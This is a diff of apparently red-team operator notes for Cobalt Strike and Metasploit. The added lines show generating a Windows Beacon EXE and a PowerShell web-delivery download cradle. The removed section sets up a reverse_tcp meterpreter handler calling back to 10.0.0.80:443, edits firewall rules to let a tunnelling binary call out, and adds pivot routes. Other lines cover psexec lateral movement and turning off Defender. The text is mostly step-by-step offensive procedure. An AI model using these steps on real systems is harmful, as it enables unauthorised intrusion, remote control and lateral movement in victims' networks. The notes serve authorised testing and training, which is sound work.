@@ -114,12 +114,14 @@ Standard: Windows Defender settings > turn off Real-time protection
 
 - Generate a payload
 Attacks > Packages > Windows Executable (S)
-Select the listener you just created > Choose
+Listener: select the http listener > Choose
 Output: Windows EXE
+Use x64 payload
 Generate
 Select the location for the payload > Save > OK
 
 Transfer the payload to your target, execute, and you should receive a call back.
+Click on Cobalt Strike and you will see a Beacon session appear in the top pane.
 
 - Interact with Beacon
 Right-click on the Beacon > Interact
@@ -136,13 +138,15 @@ sleep 30 10                                   Make Beacon call home every 30 sec
 Right-click on the X in the tab for additional options.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-- Attack 2
+# HTML Application (HTA)
+
 Attacks > Web Drive-by > Scripted Web Delivery (S)
 URI Path: /a
-Local Host: (same IP as your server)
-Local Port: 80 (same port as your Listener)
-Listener: Initial access > Choose
+Local Host: same IP as your server
+Local Port: 80
+Listener: select the http listener > Choose
 Type: powershell
+Use x64 payload
 Launch
 
 Copy the download cradle provided > OK
@@ -462,21 +466,4 @@ psexec_psh site-dc smb
 Right-click on the new http Beacon > Interact
 sleep 2
 note 3rd hop
-------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Misc notes
-
-# Catch the callback from wkstn-04
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-set lhost 10.0.0.80
-set lport 443
-run
-migrate -N explorer.exe
-
-# Make tunnels for wkuser-66
-upload fpipeknockoff.windows.amd64.exe s:\\
-shell
-netsh advfirewall firewall delete rule  name="fpipeknockoff" program="\\site-file\share\fpipeknockoff.windows.amd64.exe" & netsh advfirewall firewall add rule name="fpipeknockoff" dir=in action=allow program="\\site-file\share\fpipeknockoff.windows.amd64.exe" enable=yes & \\site-file\share\fpipeknockoff.windows.amd64.exe -c 10.0.0.80:443 <NUL >NUL 2>NUL & exit
-run post/multi/manage/autoroute CMD=add netmask=/32 subnet=172.31.2.66
-background
